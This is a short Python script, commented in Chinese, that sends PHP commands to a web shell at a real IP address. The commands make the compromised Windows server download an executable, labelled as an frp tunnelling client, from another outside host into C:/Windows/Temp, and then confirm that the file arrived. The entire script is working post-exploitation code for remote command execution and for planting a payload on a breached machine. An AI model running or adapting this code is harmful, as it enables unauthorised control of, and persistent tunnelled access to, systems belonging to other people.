#!/usr/bin/env python3
"""用 PHP 原生函数下载 frpc.exe 到 81.70"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=60)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# PHP file_get_contents 下载 (不走系统命令)
code = 'file_put_contents("C:/Windows/Temp/frpc.exe", file_get_contents("http://165.99.43.145:9124/frp_serve.exe")); echo "DL_END";'
r = cmd(code)
print("1. PHP下载:", "DL_END" in r, "|", r.strip()[-60:], flush=True)
time.sleep(2)
# 验证大小 (PHP filesize)
r = cmd('echo "SIZE:" . filesize("C:/Windows/Temp/frpc.exe");')
print("2. 大小:", r.strip()[-60:], flush=True)
